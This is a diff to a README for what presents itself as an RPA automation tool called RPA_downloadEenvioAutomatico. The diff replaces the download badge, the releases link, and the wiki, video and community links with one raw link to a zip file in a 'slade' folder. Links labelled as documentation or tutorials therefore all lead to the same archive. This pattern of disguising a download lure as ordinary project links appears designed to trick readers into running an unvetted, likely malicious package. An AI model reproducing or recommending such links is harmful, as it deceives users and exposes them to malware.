@@ -1,6 +1,6 @@
 # 🚀 RPA_downloadEenvioAutomatico - Automate Your Tasks Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Namukill/RPA_downloadEenvioAutomatico/releases)
+[![Download](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
 
 ## 🖥️ Introduction
 
@@ -10,7 +10,7 @@ Welcome to RPA_downloadEenvioAutomatico! This software helps automate manual tas
 
 You can download the latest version of RPA_downloadEenvioAutomatico from our Releases page. 
 
-[Visit this page to download](https://github.com/Namukill/RPA_downloadEenvioAutomatico/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
 
 Here are the steps to install the application:
 
@@ -66,10 +66,10 @@ Yes, you can modify task settings according to your specific needs.
 
 If you're looking for further help, here are some useful resources:
 
-- [GitHub Wiki](https://github.com/Namukill/RPA_downloadEenvioAutomatico/wiki)
-- [Tutorial Videos](https://www.youtube.com/results?search_query=RPA_downloadEenvioAutomatico)
-- [User Community](https://github.com/Namukill/RPA_downloadEenvioAutomatico/discussions)
+- [GitHub Wiki](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
+- [Tutorial Videos](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
+- [User Community](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
 
 With RPA_downloadEenvioAutomatico, you have the tools to make your work easier and more efficient. Feel free to reach out for any questions. 
 
-[Visit this page to download](https://github.com/Namukill/RPA_downloadEenvioAutomatico/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
